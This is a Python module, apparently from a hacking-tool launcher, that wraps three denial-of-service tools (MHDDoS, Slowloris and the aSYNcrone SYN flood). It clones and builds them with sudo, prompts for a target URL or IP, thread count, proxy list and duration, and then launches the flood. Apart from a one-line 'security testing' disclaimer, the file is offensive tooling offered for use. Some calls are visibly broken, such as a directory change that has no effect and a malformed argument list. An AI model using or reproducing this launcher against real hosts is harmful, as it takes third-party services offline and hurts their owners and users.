# coding=utf-8
import os
import subprocess

from core import HackingTool
from core import HackingToolsCollection

class MHDDoS(HackingTool):
    TITLE ="MHDDOs"
    DESCRIPTION = "DDoS Attack Script With 56 Methods." \
                  "DDoS attacks\n\b " \
                  "for SECURITY TESTING PURPOSES ONLY! "
    
    INSTALL_COMMANDS = [
        "git clone https://github.com/MatrixTM/MHDDoS.git",
        "cd MHDDoS;sudo pip3 install -r requirements.txt"
    ]
    PROJECT_URL = "https://github.com/MatrixTM/MHDDoS.git"

    def run(self):
        method = input("Enter Method >> ")
        url = input("Enter URL >> ")
        threads = input("Enter Threads >> ")
        proxylist = input(" Enter ProxyList >> ")
        multiple = input(" Enter Multiple >> ")
        timer = input(" Enter Timer >> ")
        os.system("cd MHDDoS;")
        subprocess.run([
            "sudo", "python3 MHDDoS", method, url, "socks_type5.4.1", threads, proxylist, multiple, timer])


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = "Slowloris is basically an HTTP Denial of Service attack." \
                  "It send lots of HTTP Request"
    INSTALL_COMMANDS = ["sudo pip3 install slowloris"]

    def run(self):
        target_site = input("Enter Target Site:- ")
        subprocess.run(["slowloris", target_site])


class Asyncrone(HackingTool):
    TITLE = "Asyncrone | Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = "aSYNcrone is a C language based, mulltifunction SYN Flood " \
                  "DDoS Weapon.\nDisable the destination system by sending a " \
                  "SYN packet intensively to the destination."
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone;sudo gcc aSYNcrone.c -o aSYNcrone -lpthread"
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        os.system("cd aSYNcrone;")
        subprocess.run([
            "sudo", "./aSYNcrone", source_port, target_ip, target_port, 1000])



class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [
        MHDDoS(),
        SlowLoris(),
        Asyncrone()
    ]
